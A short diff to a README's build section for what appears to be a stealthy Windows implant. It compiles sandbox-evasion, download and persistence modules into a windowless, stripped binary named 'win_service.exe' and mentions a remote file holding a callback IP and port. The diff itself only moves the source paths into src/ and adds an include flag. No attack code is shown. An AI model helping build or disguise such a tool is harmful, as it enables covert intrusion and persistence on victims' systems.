@@ -75,7 +75,7 @@ The remote text file must contain exactly the IP address and the port, separated
 To maintain its stealth profile and avoid dropping dependencies (like `vcruntime` or `libstdc++`), compile the binary statically using MinGW-w64 (GCC) with the C++20 standard enabled:
 
 ```bash
-g++ main.cpp AntiSandbox.cpp DownloadManager.cpp PersistenceManager.cpp -o win_service.exe -std=c++20 -static -static-libgcc -static-libstdc++ -mwindows -s -lws2_32 -lwininet -lole32 -loleaut32 -luuid
+g++ src/main.cpp src/AntiSandbox.cpp src/DownloadManager.cpp src/PersistenceManager.cpp -Iinclude -o win_service.exe -std=c++20 -static -static-libgcc -static-libstdc++ -mwindows -s -lws2_32 -lwininet -lole32 -loleaut32 -luuid
 ```
 
 **Compiler Flags Breakdown:**
